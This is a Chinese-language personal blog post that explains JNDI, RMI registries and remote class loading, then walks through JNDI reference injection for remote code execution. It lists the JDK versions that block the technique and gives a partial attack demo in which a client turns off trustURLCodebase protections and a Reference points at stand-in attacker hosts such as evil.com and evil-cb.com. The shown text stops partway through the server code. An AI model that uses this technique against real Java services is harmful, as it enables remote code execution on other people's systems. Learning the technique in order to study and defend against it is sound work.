

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/default.png">
  <link rel="icon" href="/img/default.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="KKfine&#39;s blog">
  <meta name="keywords" content="">
  
  <title>JNDI学习 - KKfine&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/atelier-estuary-light.min.css" />
    
  

  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 60vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>KKfine's blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/2.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="JNDI学习">
              
            </span>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      <div class="container nopadding-x-md">
        <div class="py-5" id="board"
          >
          
          <div class="container">
            <div class="row">
              <div class="col-12 col-md-10 m-auto">
                

<article class="page-content">
  <h1 id="JNDI了解"><a href="#JNDI了解" class="headerlink" title="JNDI了解"></a>JNDI了解</h1><p>JNDI全称为 Java Naming and DirectoryInterface（Java命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。</p>
<p>JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等。</p>
<p>简单点说，JNDI就是一组API接口。每一个对象都有一组唯一的键值绑定，将名字和对象绑定，可以通过名字检索指定的对象，而该对象可能存储在RMI、LDAP、CORBA等等。</p>
<h4 id="Java-Naming"><a href="#Java-Naming" class="headerlink" title="Java Naming"></a>Java Naming</h4><p>命名服务是一种键值对的绑定，使应用程序可以通过键检索值。所以其实命名的目的就是记录一些不方便记录的东西，就像人的名字或者dns的域名和ip地址的关系一样。不同的Naming System有不一样的记录方法。一个命名的展示由名字和分隔符提现。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/38be8b94ac38bd2bc967a73887253acf.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<h4 id="Java-Directory"><a href="#Java-Directory" class="headerlink" title="Java Directory"></a>Java Directory</h4><p>目录服务是命名服务的自然扩展。这两者之间的区别在于目录服务中对象可以有属性，而命名服务中对象没有属性。因此，在目录服务中可以根据属性搜索对象。</p>
<p>JNDI允许你访问文件系统中的文件，定位远程RMI注册的对象，访问如LDAP这样的目录服务，定位网络上的EJB组件。</p>
<h4 id="ObjectFactory"><a href="#ObjectFactory" class="headerlink" title="ObjectFactory"></a>ObjectFactory</h4><p>Object Factory用于将Naming Service（如RMI/LDAP）中存储的数据转换为Java中可表达的数据，如Java中的对象或Java中的基本数据类型。每一个Service Provider可能配有多个Object Factory。</p>
<p>JNDI注入的问题就是处在可远程下载自定义的ObjectFactory类上。</p>
<p>拿JNDI的作用到底是什么呢，似乎还是不太理解，再来看看这篇文章应该就有一个初步的概念了。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zjlolife/article/details/8881154%E3%80%82">https://blog.csdn.net/zjlolife/article/details/8881154。</a></p>
<h1 id="JNDI前置知识"><a href="#JNDI前置知识" class="headerlink" title="JNDI前置知识"></a>JNDI前置知识</h1><h2 id="JNDI结构"><a href="#JNDI结构" class="headerlink" title="JNDI结构"></a>JNDI结构</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/ab8a6aa6c78823b5d6033511732c3e81.png" srcset="/img/loading.gif" lazyload></p>
<p>JNDI由JNDI API、命名管理、JNDI SPI（service provider interface）服务提供的接口。我们的应用可以通过JNDI的API去访问相关服务提供的接口。</p>
<p>我们要使用JNDI，必须要有服务提供方，我们常用的就是JDBC驱动提供数据库连接服务，然后我们配置JNDI连接。。</p>
<p>JDK也为我们提供了一些服务接口：</p>
<ol>
<li><p>LDAP （Lightweight Directory Access Protocol） 轻量级目录访问协议</p>
</li>
<li><p>CORBA （Common Object Request Broker Architecture） 公共对象请求代理结构服务</p>
</li>
<li><p>RMI（Java Remote Method Invocation）JAVA远程远程方法调用注册</p>
</li>
<li><p>DNS（Domain Name Service）域名服务</p>
</li>
</ol>
<p>在Java Jdk中提供了5个包，提供给JNDI的功能实现：</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">javax.naming:主要用于命名操作，它提供了命名服务的类和接口，该包定义了Context接口和InitialContext类<br><br>javax.naming.directory:主要用于目录操作，它定义了DirContext接口和InitialDirContext类<br><br>javax.naming.event:在命令目录服务器中请求事件通知<br><br>javax.naming.loap:提供LADP支持<br><br>javax.naming.spi:允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务<br></code></pre></div></td></tr></table></figure>

<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="关于RMI"><a href="#关于RMI" class="headerlink" title="关于RMI"></a>关于RMI</h2><h3 id="远程方法调用"><a href="#远程方法调用" class="headerlink" title="远程方法调用"></a>远程方法调用</h3><blockquote>
<p>远程方法调用是分布式编程中的一个基本思想。实现远程方法调用的技术有很多，比如：CORBA、WebService，这两种都是独立于编程语言的。而RMI（Remote Method Invocation）是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。在RMI中对象是通过序列化方式进行编码传输的。</p>
</blockquote>
<p>其实使用远程方法调用，就会涉及一个数据格式的问题，例如在js中一般都是使用json的格式进行大部分数据的传输，在php中进行php的数据序列化将数据统一形式储存和传输。这里也是一样，这些需要被传输的对象必须可以被序列化，这要求相应的类必须实现 java.io.Serializable 接口，并且客户端的serialVersionUID字段要与服务器端保持一致。</p>
<p>在RMI远程调用中，任何可以被远程调用方法的对象必须实现<code>java.rmi.Remote</code>接口，远程对象的实现必须继承<code>UnicastRemoteObject</code>类。如果不继承<code>UnicastRemoteObject</code>类，则需要手工初始化远程对象，在远程对象的构造方法的调用<code>UnicastRemoteObject.exportObject()</code>静态方法。</p>
<blockquote>
<p>在JVM之间通信时，RMI对远程对象和非远程对象的处理方式是不一样的，它并没有直接把远程对象复制一份传递给客户端，而是传递了一个远程对象的Stub，Stub基本上相当于是远程对象的引用或者代理。Stub对开发者是透明的，客户端可以像调用本地方法一样直接通过它来调用远程方法。Stub中包含了远程对象的定位信息，如Socket端口、服务端主机地址等等，并实现了远程调用过程中具体的底层网络通信细节，所以RMI远程调用逻辑是这样的： </p>
</blockquote>
<p><img src="https://security.tencent.com/uploadimg_dir/201903/07d8ba7e439b55dd0c3240ab9a602999.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>从逻辑上来说，数据是在Client和Server之间横向流动的，但是实际上是从Client到Stub，然后从Skeleton到Server这样纵向流动的：</p>
<ol>
<li>Server端监听一个端口，这个端口是JVM随机选择的；</li>
<li>Client端并不知道Server远程对象的通信地址和端口，但是Stub中包含了这些信息，并封装了底层网络操作；</li>
<li>Client端可以调用Stub上的方法；</li>
<li>Stub连接到Server端监听的通信端口并提交参数；</li>
<li>远程Server端上执行具体的方法，并返回结果给Stub；</li>
<li>Stub返回执行结果给Client端，从Client看来就好像是Stub在本地执行了这个方法一样；</li>
</ol>
<h3 id="RMI注册表"><a href="#RMI注册表" class="headerlink" title="RMI注册表"></a>RMI注册表</h3><p>关于RMI注册表，其实就是用来解决客户端如何去调用Stub中的方法的。</p>
<p>这里所谓注册，就是提供一个注册表，在注册表中可以将方法绑定一个名字（也可以叫注册远程对象），以供其他的进程来调用需要的对象，所以Client要寻找Stub中的对象信息就直接查询这个注册表即可。</p>
<p>要注册远程对象，需要RMI URL和一个远程对象的引用。 </p>
<p><img src="https://img-blog.csdnimg.cn/e55ae81b9fab4c4bad377b25ca5a9140.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<p><code>LocateRegistry.getRegistry()</code>会使用给定的主机和端口等信息本地创建一个Stub对象作为Registry远程对象的代理，从而启动整个远程调用逻辑。服务端应用程序可以向RMI注册表中注册远程对象，然后客户端向RMI注册表查询某个远程对象名称，来获取该远程对象的Stub。 </p>
<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20220112003555011.png" srcset="/img/loading.gif" lazyload alt="image-20220112003555011"></p>
<p>这里应用使用 JNDI 获取远程 <code>sayHello()</code> 函数并传入 <code>&quot;KKfine&quot;</code> 参数进行调用时，真正执行该函数是在远程服务端，执行完成后会将结果序列化返回给应用端，这一点是需要弄清楚的。</p>
<p>使用RMI Registry之后，RMI的调用关系是这样的： </p>
<p><img src="https://security.tencent.com/uploadimg_dir/201903/efd7772c92a8e21034c5897724ef37db.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h3 id="动态加载类"><a href="#动态加载类" class="headerlink" title="动态加载类"></a><strong>动态加载类</strong></h3><p>如果远程获取RMI服务上的对象为<code>Reference</code>类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载class文件来进行实例化。因为一定会有某些类的class文件不在本地上，而像上面的Hello类是写在本地的。</p>
<p>Reference 中几个比较关键的属性：</p>
<p>​    1. <code>className </code>远程加载时所使用的类名</p>
<p>​    2.<code>classFactory</code>加载的class中需要实例化的名称</p>
<p>​    3.<code>classFactoryLocation</code>提供classes数据的地址 可以是file/ftp/http 等协议</p>
<p>例如这里定义一个 Reference 实例，并使用继承了 <code>UnicastRemoteObject</code> 类的 <code>ReferenceWrapper</code> 包裹一下实例对象，使其能够通过 RMI 进行远程访问：</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Reference refObj = <span class="hljs-keyword">new</span> Reference(<span class="hljs-string">&quot;refClassName&quot;</span>, <span class="hljs-string">&quot;insClassName&quot;</span>, <span class="hljs-string">&quot;http://example.com:12345/&quot;</span>);<br>ReferenceWrapper refObjWrapper = <span class="hljs-keyword">new</span> ReferenceWrapper(refObj);<br>registry.bind(<span class="hljs-string">&quot;refObj&quot;</span>, refObjWrapper);<br></code></pre></div></td></tr></table></figure>

<p>当有客户端通过 <code>lookup(&quot;refObj&quot;)</code> 获取远程对象时，获得到一个 Reference 类的存根，由于获取的是一个 Reference 实例，客户端会首先去本地的 <code>CLASSPATH</code> 去寻找被标识为 <code>refClassName</code> 的类，如果本地未找到，则会去请求 <code>http://example.com:12345/refClassName.class</code> 动态加载 classes 并调用 <code>insClassName</code> 的构造函数。</p>
<h3 id="JNDI-协议动态转换"><a href="#JNDI-协议动态转换" class="headerlink" title="JNDI 协议动态转换"></a>JNDI 协议动态转换</h3><p>在初始化配置 JNDI 设置时可以预先指定其上下文环境（RMI、LDAP 或者 CORBA 等）：</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Properties env = <span class="hljs-keyword">new</span> Properties();<br>env.put(Context.INITIAL_CONTEXT_FACTORY,<br>        <span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);<br>env.put(Context.PROVIDER_URL,<br>        <span class="hljs-string">&quot;rmi://localhost:1099&quot;</span>);<br>Context ctx = <span class="hljs-keyword">new</span> InitialContext(env);<br></code></pre></div></td></tr></table></figure>

<p>而在调用 <code>lookup()</code> 或者 <code>search()</code> 时，可以使用带 URI 动态的转换上下文环境，例如上面已经设置了当前上下文会访问 RMI 服务，那么可以直接使用 LDAP 的 URI 格式去转换上下文环境访问 LDAP 服务上的绑定对象：</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">ctx.lookup(<span class="hljs-string">&quot;ldap://ip:2333/&quot;</span>);<br></code></pre></div></td></tr></table></figure>

<p>具体可以看源码实现：</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">lookup</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> NamingException </span>&#123;<br>    <span class="hljs-keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> Context <span class="hljs-title">getURLOrDefaultInitCtx</span><span class="hljs-params">(Name paramName)</span> <span class="hljs-keyword">throws</span> NamingException </span>&#123;<br>    <span class="hljs-keyword">if</span> (NamingManager.hasInitialContextFactoryBuilder()) &#123;<br>        <span class="hljs-keyword">return</span> getDefaultInitCtx(); <br>    &#125;<br>    <span class="hljs-keyword">if</span> (paramName.size() &gt; <span class="hljs-number">0</span>) &#123;<br>        String str1 = paramName.get(<span class="hljs-number">0</span>);<br>        String str2 = getURLScheme(str1);  <span class="hljs-comment">// 尝试解析 URI 中的协议</span><br>        <span class="hljs-keyword">if</span> (str2 != <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-comment">// 如果存在 Schema 协议，则尝试获取其对应的上下文环境</span><br>            Context localContext = NamingManager.getURLContext(str2, <span class="hljs-keyword">this</span>.myProps);<br>            <span class="hljs-keyword">if</span> (localContext != <span class="hljs-keyword">null</span>) &#123; <br>                <span class="hljs-keyword">return</span> localContext;<br>            &#125;<br>        &#125;  <br>    &#125;<br>    <span class="hljs-keyword">return</span> getDefaultInitCtx();<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>在<code>getURLOrDefaultInitCtx</code>中会判断是否存在特定的协议，如果有代码则会使用相应的工厂去初始化上下文环境，这时候不管之前配置的工厂环境是什么，这里都会被动态地对其进行替换。</p>
<p>完整测试代码</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> JDNI.com.RMI;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RMI_REMOTE_REGISTER_TEST</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException, RemoteException, AlreadyBoundException </span>&#123;<br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, String.valueOf(<span class="hljs-keyword">true</span>));<br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);<br>        <span class="hljs-comment">//初始化jndi服务设置</span><br>        Properties env = <span class="hljs-keyword">new</span> Properties();<br>        <span class="hljs-comment">//初始化上下文工厂名，不同的目录服务有不同的名字。例如DNS的是“com.sun.jndi.dns.DnsContextFactory”</span><br>        env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);<br>        <span class="hljs-comment">//设置JNDI提供服务的URL地址</span><br>        env.put(Context.PROVIDER_URL,<span class="hljs-string">&quot;rmi://localhost:1099&quot;</span>);<br>        env.put(<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>,<span class="hljs-keyword">true</span>);<br><br>        Context ctx = <span class="hljs-keyword">new</span> InitialContext(env);<br><br>        <span class="hljs-comment">//rmi注册</span><br>        Registry registry = LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        Hello h1 = <span class="hljs-keyword">new</span> HelloImpl();<br>        registry.bind(<span class="hljs-string">&quot;hello&quot;</span>,h1);<br><br>        <span class="hljs-comment">//动态加载类</span><br>        Reference remote_load  = <span class="hljs-keyword">new</span> Reference(<span class="hljs-string">&quot;remote_load&quot;</span>,<span class="hljs-string">&quot;remote_load_test&quot;</span>,<span class="hljs-string">&quot;http://39.10.239.30/JNDI/&quot;</span>);<br>        ReferenceWrapper remote_loadWrapper = <span class="hljs-keyword">new</span> ReferenceWrapper(remote_load);<br>        registry.bind(<span class="hljs-string">&quot;remoteLoad&quot;</span>,remote_loadWrapper);<br><br>        <span class="hljs-comment">//远程服务端调用方法</span><br>        Hello reh1 = (Hello) ctx.lookup(<span class="hljs-string">&quot;hello&quot;</span>);<br>        reh1.sayHello(<span class="hljs-string">&quot;KKfine&quot;</span>);<br><br>        <span class="hljs-comment">//远程调用本地不存在的class</span><br>        Object test = ctx.lookup(<span class="hljs-string">&quot;remoteLoad&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/50ed7cf19e7a45339b3a7618da9668f6.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<h1 id="JNDI-References注入"><a href="#JNDI-References注入" class="headerlink" title="JNDI References注入"></a>JNDI References注入</h1><p>既然上面说到可以加载外部类，那么这里自然就联想到如果加载我们的恶意类不就能够RCE了。</p>
<h2 id="前提条件-amp-JDK防御"><a href="#前提条件-amp-JDK防御" class="headerlink" title="前提条件&amp;JDK防御"></a>前提条件&amp;JDK防御</h2><p>要想成功利用JNDI注入漏洞，重要的前提就是当前Java环境的JDK版本，而JNDI注入中不同的攻击向量和利用方式所被限制的版本号都有点不一样。</p>
<p>这里将所有不同版本JDK的防御都列出来：</p>
<ul>
<li>JDK 6u45、7u21之后：<code>java.rmi.server.useCodebaseOnly</code>的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的<code>java.rmi.server.codebase</code>指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</li>
<li>JDK 6u141、7u131、8u121之后：增加了<code>com.sun.jndi.rmi.object.trustURLCodebase</code>选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</li>
<li>JDK 6u211、7u201、8u191之后：增加了<code>com.sun.jndi.ldap.object.trustURLCodebase</code>选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</li>
</ul>
<p>因此，我们在进行JNDI注入之前，必须知道当前环境JDK版本这一前提条件，只有JDK版本在可利用的范围内才满足我们进行JNDI注入的前提条件。</p>
<h2 id="RMI攻击"><a href="#RMI攻击" class="headerlink" title="RMI攻击"></a>RMI攻击</h2><p>利用RMI的攻击，首先就是将恶意类绑定在注册表中，恶意的远程引用指向我们的恶意类。就是在<code>lookup()</code>外部参数可控或者<code>References</code>构造中的<code>classFactoryLocation</code>参数外部可控时，将这个参数设置成我们的远程恶意类，会使用户的JNDI客户端访问注册表中的恶意引用，从而加载远程的恶意类，最终实现远程代码执行。流程如图：</p>
<p><img src="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/6.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>这里的流程可以试着自己理解并且写出来。</p>
<p>1.首先就是当参数可控时，我们利用动态加载类的特性传入一个我们恶意服务器的地址比如这里是<code>rmi://evil.com:1099</code>，传入之后原先的<code>rmi://localhost:1099</code>便已经被替换掉了</p>
<p>2.然后这个恶意服务中<code>Reference</code>绑定的是我们的恶意对象<code>Reference(&quot;EvilObject&quot;, &quot;EvilObject&quot;, &quot;http://evil-cb.com/&quot;)</code></p>
<p>3.接着当客户端查询这个类时，在本地没有发现，便会查询注册表，但这是我们的恶意服务已经像注册表中提供了它所需要的类，也就是我们的恶意类，由此便会被客户端请求调用，从而执行我们的命令。</p>
<p>攻击demo</p>
<p>客户端</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> JDNI.com.RMIattack;<br><br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JNDIClient</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException </span>&#123;<br><br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, String.valueOf(<span class="hljs-keyword">true</span>));<br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);<br>        <br>        String uri = <span class="hljs-string">&quot;rmi://127.0.0.1/evilObj&quot;</span>;<br>        Context ctxt = <span class="hljs-keyword">new</span> InitialContext();<br>        ctxt.lookup(uri);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>服务端</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> JDNI.com.RMIattack;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RMIserver</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span 